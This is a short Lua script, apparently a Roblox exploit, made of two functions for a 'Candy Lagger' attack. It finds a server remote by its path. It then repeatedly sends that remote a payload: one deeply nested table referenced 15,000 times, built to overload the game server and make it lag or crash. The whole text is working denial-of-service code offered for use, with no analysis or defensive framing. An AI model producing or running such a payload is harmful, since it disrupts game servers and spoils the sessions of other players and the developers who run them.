local function getCandyLaggerRemote(path)
	if not path or path=="" then return nil end
	local obj=game
	local clean=path:gsub("^game%.","")
	for piece in clean:gmatch("[^%.]+") do
		if not obj then return nil end
		obj=obj[piece]
	end
	return obj
end

local function sendCandyLaggerPayload(depth,attempts)
	local mainTable={}
	local spamTable={{}}
	local ptr=spamTable[1]
	for _=1,depth do
		local newTable={}
		table.insert(ptr,newTable)
		ptr=newTable
	end
	for i=1,15000 do
		table.insert(mainTable,spamTable)
		if i%1000==0 then task.wait() end
	end
	local remoteObj=getCandyLaggerRemote(CANDY_LAGGER_REMOTE)
	if not remoteObj then return end
	for _=1,attempts do
		pcall(function()
			if remoteObj:IsA("RemoteEvent") then
				remoteObj:FireServer(mainTable)
			elseif remoteObj:IsA("RemoteFunction") then
				remoteObj:InvokeServer(mainTable)
			end
		end)
	end
end

